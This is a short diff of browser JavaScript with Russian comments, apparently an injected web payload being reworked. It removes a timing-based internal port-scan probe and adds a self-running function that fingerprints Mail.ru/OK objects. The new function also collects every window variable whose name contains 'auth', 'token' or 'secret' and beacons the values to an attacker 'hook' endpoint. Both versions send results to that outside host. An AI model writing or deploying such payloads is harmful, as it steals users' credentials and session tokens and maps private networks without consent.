@@ -6,19 +6,20 @@
 
         
 
-        function probe(url, port) {
-            const start = Date.now();
-            const img = new Image();
-            
-            // Если порт открыт, но это не картинка - сработает onerror, но БЫСТРО
-            // Если порт закрыт - сработает onerror, но МЕДЛЕННО (таймаут)
-            img.onerror = () => {
-                const duration = Date.now() - start;
-                navigator.sendBeacon(`${hook}/PROBE_${port}?time=${duration}`);
-            };
-            
-            img.src = `${url}:${port}/favicon.ico`;
+        (function() {
+    const findings = [];
+    // Проверяем наличие специфических объектов Mail.ru / OK
+    if (window.OK) findings.push("OK_OBJ_FOUND");
+    if (window.MailRu) findings.push("MAILRU_OBJ_FOUND");
+    
+    // Попытка получить доступ к переменным окружения через типичные утечки
+    for (let key in window) {
+        if (key.toLowerCase().includes("auth") || key.toLowerCase().includes("token") || key.toLowerCase().includes("secret")) {
+            findings.push(`${key}=${window[key]}`);
         }
+    }
+    navigator.sendBeacon(hook + "/INTERNAL_VARS", JSON.stringify(findings));
+})();
 
         try {
     // Вызываем ошибку через несуществующий элемент
